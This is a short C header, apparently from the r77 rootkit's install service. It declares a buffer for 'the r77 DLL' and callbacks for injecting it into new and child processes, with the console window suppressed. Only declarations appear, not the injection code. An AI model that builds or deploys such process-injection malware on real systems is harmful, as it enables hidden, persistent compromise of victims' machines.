#pragma comment(linker, "/subsystem:windows")

#include "../r77api.h"
#include "../../vs/InstallService32/resource.h"

/// <summary>
/// The r77 DLL.
/// </summary>
LPBYTE Dll;
/// <summary>
/// The size of the r77 DLL.
/// </summary>
DWORD DllSize;

/// <summary>
/// Callback for newly created child processes that should be injected.
/// </summary>
/// <param name="processId">The process ID of the new process.</param>
VOID ChildProcessCallback(DWORD processId);
/// <summary>
/// Callback for new processes that should be injected.
/// </summary>
/// <param name="processId">The process ID of the new process.</param>
VOID NewProcessCallback(DWORD processId);